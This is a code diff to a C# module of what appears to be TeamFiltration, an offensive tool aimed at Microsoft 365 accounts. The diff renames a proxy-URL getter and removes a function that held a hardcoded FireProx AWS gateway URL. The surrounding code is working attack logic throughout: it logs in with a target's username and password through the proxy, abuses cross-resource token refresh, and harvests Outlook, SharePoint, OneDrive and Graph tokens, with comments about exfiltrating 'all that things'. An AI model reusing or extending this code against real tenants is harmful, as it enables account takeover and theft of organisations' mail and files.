@@ -104,7 +104,7 @@ namespace TeamFiltration.Modules
                     var freshToken = await msolHandler.LoginAttemptFireProx(
                         accObject.Username,
                         accObject.Password,
-                        _globalProperties.GetFireProxURL(),
+                        _globalProperties.GetBaseUrl(),
                         (accObject.ResourceUri, accObject.ResourceClientId));
 
                     await ExfilFromToken(
@@ -307,7 +307,7 @@ namespace TeamFiltration.Modules
                 }
                 */
                 #endregion
-                var proxyURL = _globalProperties.GetFireProxURL();
+                var proxyURL = _globalProperties.GetBaseUrl();
                 foreach (var resource in resList)
                 {
                     var loginResp = await msolHandler.LoginAttemptFireProx(username, password, proxyURL, resource);
@@ -333,44 +333,7 @@ namespace TeamFiltration.Modules
                 return validResList.FirstOrDefault();
             }
         }
-        private static async Task<List<(string uri, string clientId)>> EnumerateConditionalAccess(string username, BearerTokenResp bearerToken, MSOLHandler msolHandler)
-        {
-            var validResList = new List<EnumeratedConditionalAccess> { };
-            var resList = Helpers.Generic.GetResc();
-
-            List<EnumeratedConditionalAccess> alreadyEnumedrated = _databaseHandler.QueryEnumeratedConditionalAccess(username);
-
-            if (alreadyEnumedrated?.Count() > 0)
-                return alreadyEnumedrated.Select(x => (x.ResourceUri, x.ResourceClientId)).ToList();
-            else
-            {
-                #region userCreds
-               
-                var proxyURL = "https://694qkn4gp3.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token";
-                foreach (var resource in resList)
-                {
-                    var loginResp = await msolHandler.RefreshAttempt(bearerToken, proxyURL, resource.uri, resource.clientId, false, false);
-
-                    if (loginResp.bearerTokenError == null)
-                    {
-                        validResList.Add(new EnumeratedConditionalAccess() { ResourceClientId = resource.clientId, ResourceUri = resource.uri, Username = username });
-                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => CAN ACCESS", "[US]") { }, true);
-
-                    }
-                    else
-                    {
-                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => DENIED ACCESS", "[US]") { }, true);
-
-                    }
-
-                }
-                #endregion
-
-                _databaseHandler.WriteEnumeratedConditionalAccess(validResList);
-
-                return validResList.Select(x => (x.ResourceUri, x.ResourceClientId)).ToList();
-            }
-        }
+  
         private static async Task PrepareExfilCreds(string username, string password, ExifilOptions exfilOptions, MSOLHandler msolHandler)
         {
 
@@ -393,7 +356,7 @@ namespace TeamFiltration.Modules
                 validResponse.bearerToken = JsonConvert.DeserializeObject<BearerTokenResp>(enumeratedConditionalAccess?.ResponseData);
 
                 //Check for cross-refresh
-                var crossRefresh = await msolHandler.RefreshAttempt(validResponse.bearerToken, _globalProperties.GetFireProxURL(), "https://api.spaces.skype.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");
+                var crossRefresh = await msolHandler.RefreshAttempt(validResponse.bearerToken, _globalProperties.GetBaseUrl(), "https://api.spaces.skype.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");
 
                 //If so, procceed
                 if (crossRefresh.bearerToken?.access_token != null)
@@ -423,12 +386,12 @@ namespace TeamFiltration.Modules
                 //At this point we have a token for a valid ressource, let's try to refresh this into another ressource, confirming cross-refresh 
                 var notTheSameRessource = Helpers.Generic.RandomO365Res("https://api.spaces.skype.com", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");
 
-                var tempToken = await msolHandler.RefreshAttempt(tokenObject, _globalProperties.GetFireProxURL(), notTheSameRessource.Uri, notTheSameRessource.clientId);
+                var tempToken = await msolHandler.RefreshAttempt(tokenObject, _globalProperties.GetBaseUrl(), notTheSameRessource.Uri, notTheSameRessource.clientId);
 
                 if (tempToken.bearerToken != null)
                 {
 
-                    var crossRefresh = await msolHandler.RefreshAttempt(tempToken.bearerToken, _globalProperties.GetFireProxURL(), "https://api.spaces.skype.com", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");
+                    var crossRefresh = await msolHandler.RefreshAttempt(tempToken.bearerToken, _globalProperties.GetBaseUrl(), "https://api.spaces.skype.com", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");
                     if (crossRefresh.bearerToken?.access_token != null)
                     {
                         _databaseHandler.WriteLog(new Log("EXFIL", $"Cross-resource-refresh allowed, we can exfil all that things!", "") { }, true);
@@ -899,16 +862,16 @@ namespace TeamFiltration.Modules
             {
 
                 if (!string.IsNullOrEmpty(companySharePointUrl))
-                    companySharePointToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(companySharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
+                    companySharePointToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://" + new Uri(companySharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
 
                 if (!string.IsNullOrEmpty(personalSharePointUrl))
-                    personalOneDriveToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(personalSharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
+                    personalOneDriveToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://" + new Uri(personalSharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
 
-                outlookToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://outlook.office365.com", "d3590ed6-52b3-4102-aeff-aad2292ab01c"));
+                outlookToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://outlook.office365.com", "d3590ed6-52b3-4102-aeff-aad2292ab01c"));
 
-                msGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.microsoft.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
+                msGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://graph.microsoft.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
 
-                adGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.windows.net", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
+                adGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://graph.windows.net", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
 
                 var bearerTokensOutPath = Path.Combine(baseUserOutPath, @"Tokens");
                 Directory.CreateDirectory(bearerTokensOutPath);
@@ -930,10 +893,10 @@ namespace TeamFiltration.Modules
             {
                 //Get the tokens needed if we don't already have them
                 if (adGraphToken.bearerToken?.access_token == null)
-                    adGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.windows.net", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
+                    adGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://graph.windows.net", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
 
                 if (msGraphToken.bearerToken?.access_token == null)
-                    msGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.microsoft.com", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
+                    msGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://graph.microsoft.com", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
 
 
                 //Did we get them, if so let's exfil!
@@ -948,7 +911,7 @@ namespace TeamFiltration.Modules
             {
                 //Get the tokens neede if we don't already have them
                 if (outlookToken.bearerToken?.access_token == null)
-                    outlookToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://outlook.office365.com", "d3590ed6-52b3-4102-aeff-aad2292ab01c"));
+                    outlookToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://outlook.office365.com", "d3590ed6-52b3-4102-aeff-aad2292ab01c"));
 
                 //Did we get them, if so let's exfil!
                 if (outlookToken.bearerToken?.access_token != null)
@@ -961,7 +924,7 @@ namespace TeamFiltration.Modules
             {
                 //Get the tokens neede if we don't already have them
                 if (personalOneDriveToken.bearerToken?.access_token == null)
-                    personalOneDriveToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(personalSharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
+                    personalOneDriveToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://" + new Uri(personalSharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
 
                 //Did we get them, if so let's exfil!
                 if (inputToken?.access_token != null && personalOneDriveToken.bearerToken?.access_token != null)
@@ -974,14 +937,14 @@ namespace TeamFiltration.Modules
 
                 //Get the tokens neede if we don't already have them
                 if (companySharePointToken.bearerToken?.access_token == null)
-                    companySharePointToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(companySharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
+                    companySharePointToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://" + new Uri(companySharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
 
                 if (personalOneDriveToken.bearerToken?.access_token == null)
-                    personalOneDriveToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(personalSharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
+                    personalOneDriveToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://" + new Uri(personalSharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));
 
 
                 if (msGraphToken.bearerToken?.access_token == null)
-                    msGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.microsoft.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
+                    msGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetBaseUrl(), ("https://graph.microsoft.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));
 
 
                 //Did we get them, if so let's exfil!
@@ -1143,17 +1106,17 @@ namespace TeamFiltration.Modules
 
             if (exifilOptions.Tokens)
             {
-                companySharePointToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), companySharePointUrl);
+                companySharePointToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), companySharePointUrl);
 
-                personalOneDriveToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), personalSharePointUrl);
+                personalOneDriveToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), personalSharePointUrl);
 
-                outlookToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://outlook.office365.com");
+                outlookToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), "https://outlook.office365.com");
 
                 //(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) azurePSToken = await MSOLHandler.RefreshAttempt(teamsToken.TokenResp, "https://management.core.windows.net/");
 
-                msGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.microsoft.com");
+                msGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com");
 
-                adGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.windows.net");
+                adGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), "https://graph.windows.net");
 
 
                 var bearerTokensOutPath = Path.Combine(baseUserOutPath, @"Tokens");
@@ -1174,10 +1137,10 @@ namespace TeamFiltration.Modules
             {
                 //Get the tokens needed if we don't already have them
                 if (adGraphToken.bearerToken?.access_token == null)
-                    adGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.windows.net");
+                    adGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), "https://graph.windows.net");
 
                 if (msGraphToken.bearerToken?.access_token == null)
-                    msGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.microsoft.com");
+                    msGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com");
 
 
                 //Did we get them, if so let's exfil!
@@ -1192,7 +1155,7 @@ namespace TeamFiltration.Modules
             {
                 //Get the tokens neede if we don't already have them
                 if (outlookToken.bearerToken?.access_token == null)
-                    outlookToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://outlook.office365.com");
+                    outlookToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), "https://outlook.office365.com");
 
                 //Did we get them, if so let's exfil!
                 if (outlookToken.bearerToken?.access_token != null)
@@ -1205,7 +1168,7 @@ namespace TeamFiltration.Modules
             {
                 //Get the tokens neede if we don't already have them
                 if (personalOneDriveToken.bearerToken?.access_token == null)
-                    personalOneDriveToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), personalSharePointUrl);
+                    personalOneDriveToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), personalSharePointUrl);
 
                 //Did we get them, if so let's exfil!
                 if (teamsToken?.access_token != null && personalOneDriveToken.bearerToken?.access_token != null)
@@ -1221,13 +1184,13 @@ namespace TeamFiltration.Modules
 
                 //Get the tokens neede if we don't already have them
                 if (companySharePointToken.bearerToken?.access_token == null)
-                    companySharePointToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), companySharePointUrl);
+                    companySharePointToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), companySharePointUrl);
 
                 if (personalOneDriveToken.bearerToken?.access_token == null)
-                    personalOneDriveToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), personalSharePointUrl);
+                    personalOneDriveToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), personalSharePointUrl);
 
                 if (msGraphToken.bearerToken?.access_token == null)
-                    msGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.microsoft.com");
+                    msGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com");
 
 
                 //Did we get them, if so let's exfil!
